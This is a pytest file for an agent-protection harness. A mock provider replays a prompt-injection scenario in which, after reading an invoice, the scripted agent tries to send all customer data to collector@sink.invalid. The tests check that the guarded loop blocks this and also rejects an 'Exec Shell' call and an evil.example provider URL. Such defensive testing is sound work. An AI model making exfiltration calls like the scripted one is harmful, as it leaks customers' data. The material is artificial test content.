"""Live-agent loop tests. The provider here is an httpx.MockTransport test double that returns
scripted responses; these tests check the loop's mechanics (tool dispatch, denial, accounting,
failure handling), not any model's behaviour. Real-model runs need a configured provider."""

import json

import pytest

httpx = pytest.importorskip("httpx")

from necroshield.catalog import DOCUMENT_INJECTION  # noqa: E402
from necroshield.live import ProviderConfig, run_live  # noqa: E402
from necroshield.verification import verify_export  # noqa: E402

CONFIG = ProviderConfig("https://llm.test/v1", "test-key", "scripted-double", "test-double", 1.0, 2.0)


def _tool_call(i, name, args):
    return {"id": f"c{i}", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


SCRIPT = [
    [_tool_call(1, "read_document", {"path": "invoices/inv-2026-0413"})],
    [_tool_call(2, "send_message", {"to": "collector@sink.invalid", "attach": "all_customers"}),
     _tool_call(3, "read_memory", {"key": "payee/hollow-pine"})],
    [_tool_call(4, "write_report", {"report_id": "summary",
                                    "body": "Invoice INV-2026-0413 total 124.00 USD payee ACCT-HP-2231"})],
    None,
]


def _client(script, seen):
    turns = iter(script)

    def handler(request):
        seen.append(json.loads(request.content))
        calls = next(turns)
        message = {"role": "assistant", "content": None if calls else "done", "tool_calls": calls}
        return httpx.Response(200, json={"choices": [{"message": message}],
                                         "usage": {"prompt_tokens": 100, "completion_tokens": 10}})
    return httpx.Client(transport=httpx.MockTransport(handler))


def test_protected_live_loop_denies_before_dispatch_and_accounts_usage():
    seen = []
    result = run_live(DOCUMENT_INJECTION, CONFIG, protected=True, client=_client(SCRIPT, seen))
    calls = [e["data"] for e in result["events"] if e["kind"] == "tool_call"]
    assert [(c["tool"], c["allowed"], c["dispatched"]) for c in calls] == [
        ("read_document", True, True), ("send_message", False, False),
        ("read_memory", True, True), ("write_report", True, True)]
    assert result["outcome"]["attack_succeeded"] is False and result["outcome"]["task_completed"] is True
    assert result["usage"] == {"prompt_tokens": 400, "completion_tokens": 40}
    assert result["cost_usd"] == round((400 * 1.0 + 40 * 2.0) / 1_000_000, 6)
    assert result["provider"]["model"] == "scripted-double"
    denial_message = seen[2]["messages"][-2]
    assert denial_message["role"] == "tool" and denial_message["content"].startswith("DENIED")
    assert verify_export(result) == []


def test_baseline_live_loop_lets_the_attack_through():
    result = run_live(DOCUMENT_INJECTION, CONFIG, protected=False, client=_client(SCRIPT, []))
    assert result["outcome"]["attack_succeeded"] is True


def test_provider_failure_is_recorded_not_raised():
    def handler(request):
        return httpx.Response(500)
    result = run_live(DOCUMENT_INJECTION, CONFIG, protected=True,
                      client=httpx.Client(transport=httpx.MockTransport(handler)))
    assert result["outcome"]["failure"] == "provider error: HTTPStatusError"
    assert verify_export(result) == []


def test_malformed_model_tool_calls_are_rejected_without_dispatch():
    script = [[{"id": "x", "type": "function", "function": {"name": "read_document", "arguments": "{not json"}}],
              [_tool_call(2, "Exec Shell", {"cmd": "ls"})], None]
    result = run_live(DOCUMENT_INJECTION, CONFIG, protected=False, client=_client(script, []))
    assert [e["kind"] for e in result["events"]].count("invalid_call") == 2
    assert not any(e["kind"] == "tool_call" for e in result["events"])


def test_tampered_live_decision_fails_verification():
    result = run_live(DOCUMENT_INJECTION, CONFIG, protected=True, client=_client(SCRIPT, []))
    denied = next(e for e in result["events"] if e["kind"] == "tool_call" and not e["data"]["allowed"])
    denied["data"]["allowed"] = True
    problems = verify_export(result)
    assert any("hash mismatch" in p for p in problems)


@pytest.mark.parametrize("env", [
    {"NECROSHIELD_LLM_BASE_URL": "http://llm.test/v1", "NECROSHIELD_LLM_API_KEY": "k", "NECROSHIELD_LLM_MODEL": "m",
     "NECROSHIELD_LLM_ALLOWED_HOSTS": "llm.test"},
    {"NECROSHIELD_LLM_BASE_URL": "https://evil.example/v1", "NECROSHIELD_LLM_API_KEY": "k", "NECROSHIELD_LLM_MODEL": "m",
     "NECROSHIELD_LLM_ALLOWED_HOSTS": "llm.test"},
])
def test_provider_destination_must_be_https_and_allowlisted(env):
    with pytest.raises(ValueError):
        ProviderConfig.from_env(env)


def test_missing_provider_means_unavailable():
    assert ProviderConfig.from_env({}) is None
